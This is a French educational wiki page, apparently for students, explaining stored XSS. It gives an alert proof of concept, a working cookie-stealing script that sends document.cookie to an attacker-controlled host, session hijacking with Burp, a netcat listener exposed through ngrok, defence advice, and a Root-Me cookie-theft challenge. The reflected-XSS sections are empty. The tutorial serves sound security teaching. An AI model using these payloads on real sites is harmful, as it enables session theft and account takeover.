---
title: XSS
description: La faille XSS constitue un risque majeur pour tous les sites internet qui ont besoin de traiter des entrées utilisateur. Cette dernière était présente dans le top 10 de l'OWASP en 2017.
published: true
date: 2020-09-22T09:35:56.783Z
tags: 
editor: undefined
dateCreated: 2019-11-13T13:44:57.273Z
---

# Présentation de la faille

La faille XSS (Cross-Site Scripting) fait partie des vulnérabilités les plus courantes que l'on peut trouver sur les sites web.
Elle a été répertoriée sur le top ten de l'[OWASP](https://www.owasp.org/index.php/Main_Page) (Open Web Application Security Project) de 2017.

L'objectif de cette faille est d'injecter du code JS (JavaScript) via une entrée utilisateur quelconque (URL, input ...) dans le site web et de le faire exécuter sur le navigateur client.

> Il faut bien noter que, contrairement à beaucoup de failles que nous aborderons au fur et à mesure, cette dernière aura une conséquence au niveau du navigateur client et non pas au niveau du serveur.
Le JavaScript est le seul langage web pouvant s'exécuter côté client (front-end).
Les autres langages (PHP, Java, Python ...) s'exécute côté serveur (back-end).
{.is-info}

Une exploitation courante de cette faille est, par exemple, le vol des cookies d'un client qui est connecté sur un site (ces derniers peuvent être utilisés pour se connecter en tant que la personne dont on a dérobé les cookies).

# Repérer un site vulnérable 

Comme expliqué plus haut, le point d'entrée d'une XSS est une interface de communication entre l'utilisateur et le site web.

La première étape pour détecter une XSS est donc de repérer ce qui pourrait servir de point d'entrée. 

Nous distinguerons deux types de XSS, que nous présenterons séparement.

## XSS stored 

Pour illustrer ce type de XSS, nous prendrons l'exemple d'un livre d'or proposé sur le site internet d'une association.

Dans l'onglet "Livre d'or", les visiteurs peuvent laisser un commentaire via une zone de texte.

Dans ce même onglet, les visiteurs peuvent voir les commentaires qui ont été laissés par les autres visiteurs.

Afin de stocker les commentaires qui ont été laissés, le site dispose d'une base de données.

### Proof of concept

Imaginons qu'au lieu d'écrire du texte brut dans le livre d'or, nous écrivions le code JS suivant (i.e. le stocker dans la base de données) :

```
<script> alert(1); </script>
```

Cela impliquerait que, chaque commentaire étant lu par chaque visiteur, le navigateur de chaque visiteur exécutera le code JS sans faire de distinction avec du texte brut.

> Ainsi, si après avoir écrit ce bout de code dans le livre d'or, et après avoir rafraîchi la page, une pop-up affichant "1" s'affiche, c'est que le site est vulnérable à une XSS stored.
{.is-success}

> De manière générale, afin de tester la vulnérabilité, on privilégiera de tester d'inclure du code HTML. Par exemple : 
"Ceci est un \<u>message\</u>"
Si "<u>message</u>" s'affiche en souligné, cela signifiera que les balises peuvent être interprétées et donc de même pour la balise \<script>.
{.is-info}

### Exploitation

Nous avons mentionné plus haut, qu'une des finalités possibles de la faille XSS était le vol des cookies. Si l'on souhaite voler les cookies des utilisateurs, au lieu de leur afficher un mot en souligné ou leur afficher un pop-up, nous pouvons tenter le code suivant :

```
<script>document.location('http://MON_IP/pirate.php?cookie='+document.cookie);</script>
```

où l'on remplacera MON_IP par un nom de domaine ou une adresse IP que l'on contrôle.

> Si, comme 99% des gens sur cette terre, tu ne disposes ni d'une IP publique ni d'un site web, je te renvoie à la dernière rubrique de ce tutoriel.
{.is-warning}

Si tout fonctionne bien, au fur et à mesure que des gens visitent la page du livre d'or sur laquelle on a écrit notre code JS malicieux, nous devrions voir apparaître un certain nombre de requêtes se faire au niveau de notre IP / nom de domaine :
```
GET /pirate.php?cookie=COOKIE=NkI9qa4cdLGO2P7MIsWS8ofA6 HTTP/1.1" 404
GET /pirate.php?cookie=COOKIE=GkI4qa4cdLGO2P1NIsWS8ofA8 HTTP/1.1" 404
GET /pirate.php?cookie=COOKIE=2kI9qa4cdLGO2PaMIs8S8ofb6 HTTP/1.1" 404
```

> Il s'agira en fait des propres navigateurs des clients connectés qui exécuteront "bêtement" le code JS que l'on leur a transmis, ici en l'occurence, une redirection en passant dans l'URL leur cookie de connexion.
{.is-success}

Il suffira ensuite de se connecter sur le site avec les cookies récupérés, avec l'aide d'un logiciel comme BURP, par exemple.

## XSS reflected

### Proof of concept

### Exploitation

# S'en protéger

Afin de se protéger des failles XSS, on applique la règle d'or N°1 en sécurité web :

> NE JAMAIS FAIRE CONFIANCE A L'UTILISATEUR !!!
TOUT LE MONDE EST MECHANT !!!
{.is-danger}

Ou encore, de manière plus pédagogue : 

> Il faut contrôler tout ce qui vient des utilisateurs. 
Chaque zone d'intéraction [ utilisateur / site web ] doit être <b>très</b> contrôlée.
Il ne faut pas oublier que l'utilisateur peut être quelqu'un ne venant pas d'un milieu informatique, et peut donc copier-coller du contenu pouvant par exemple casser la page la plus utilisée par les utilisateurs.
{.is-danger}

Bon, tout cela est bien gentil, allons voir comment cela se fait concrètement.
Un des moyens les plus efficaces de se défendre est de parcourir tout ce qui est entré par l'utilisateur. Dans le cas de cette faille, on parle uniquement de "texte" (code) malicieux.

Pour cela, il est fortemment recommandé de mettre en place un système de "whitelisting" : tout caractère qui n'est pas autorisé est banni et doit donc être bridé (échapper le caractère ou tout simplement le supprimer).

> Pourquoi ne pas utiliser de blacklisting (tout caractère qui n'est pas interdit est autorisé) ?
{.is-info}

Lorsque l'on commence à se plonger dans le monde nébuleux du pentest, on se rend rapidement compte que tout est bon pour mettre à mal les défenses que l'on souhaite cibler. 
Il existera toujours quelque chose auquel on n'aura pas pensé.

> Il vaut toujours mieux oublier d'accepter quelque chose de légitime que d'oublier de bannir quelque chose d'illégitime.
{.is-warning}


# Obtenir une IP publique

Lorsque l'on réalise des manipulations en pentest, il est extrêmement fréquent que l'on soit amené à récupérer des données extraites, notamment en provenance des victimes.

Afin de rediriger les flux vers son PC, on a besoin d'être visible sur internet : c'est-à-dire d'avoir une IP publique. 
En effet, pour aller sur internet, ton PC a bien une IP, mais une IP privée, non routable sur internet. Afin d'y accéder, un élément réseau intermédiaire te "prête" une IP (chez toi, ta box).
Pour nous, cela n'est pas pratique.

Afin de contourner cela, je te propose un outil appelé "ngrok".
Ngrok va te préter une IP publique et créer un tunnel entre le serveur qui te prête l'IP et ton localhost (aka ton PC).

Tu pourras trouver les instructions d'installation [ici](https://ngrok.com/download).

> A noter que Ngrok est bridé à l'ESIEE.
> Si on utilise donc un des PC de l'école, Ngrok ne va pas marcher. Il te faudra utiliser un système alternatif, comme par exemple des sites web qui te fournissent des IP temporaires en ligne (moins pratique).
{.is-info}


Ensuite, ouvre un premier terminal et entre la commande :

```
nc -lnvp 8888
```

Cela va ouvrir à l'écoute le port 8888 sur ta machine.
Ensuite, ouvre un second terminal et entre la commande :

```
# Si tu souhaites une IP publique pour du protocole TCP
./ngrok tcp 8888 
# Si tu souhaites une IP publique pour du protocole HTTP (requêtes web)
# C'est par exemple ce qui nous intéresse dans le cas d'un "document.location();" en JS
./ngrok http 8888
```

Cette commande va demander à Ngrok de t'ouvrir un port TCP / HTTP sur un de leurs serveurs. 
Tu devrais voir une IP s'afficher sous forme d'un nom de domaine, c'est ton IP publique.

> Si tu as fait une demande pour du TCP, tu devrais avoir, avec l'IP publique, un numéro de port, c'est le port TCP qui est ouvert pour toi sur le serveur Ngrok.
Si tu as fait une demande pour du HTTP, ton port est implicite, le 80 pour HTTP et le 443 pour HTTPS.
{.is-info}

## Travail pratique avec Ngrok

Ce petit TP doit se faire à deux.
L'idée est de mieux comprendre comment marche Ngrok et comment, en conséquence, on peut faire communiquer deux PC quelconques.

Sur le premier PC :

1. Ouvrir un terminal et taper :
```
nc -lnvp 8888
```
2. Ouvrir un second terminal et taper :
```
./ngrok tcp 8888
```
3. Bien noter l'IP donnée (nom de domaine) et le numéro de port donné !

Sur le second PC :

1. Ouvrir un terminal et taper, selon l'IP donnée / port donné :
```
nc 0.tcp.ngrok.io 12360
```
2. Taper un message !

> Si tout s'est bien passé, le message tapé sur le second PC a dû être affiché sur le premier terminal du premier PC !
{.is-success}

> Netcat (nc) est un outil que l'on utilise beaucoup, notamment pour transmettre des ordres sur les machines infectées ...
{.is-info}

# Application : challenge Root-Me

Comme l'indique ce titre, il est temps de vérifier si tu as tout compris !

Je t'invite donc à te rendre sur le lien [suivant](https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stored-1) et à réaliser le challenge. 
Tout ce que tu as besoin de savoir t'a été donné lors de ce tutoriel !

> Il s'agit, comme son nom l'indique, d'une XSS stored.
> Sur le site en question, un admin (un bot, qui simule la connexion d'un admin) se connecte régulièrement. 
> A toi de voler son cookie !
{.is-info}

P.S : si tu ne l'as pas encore fait, crée un compte sur Root-Me ! 
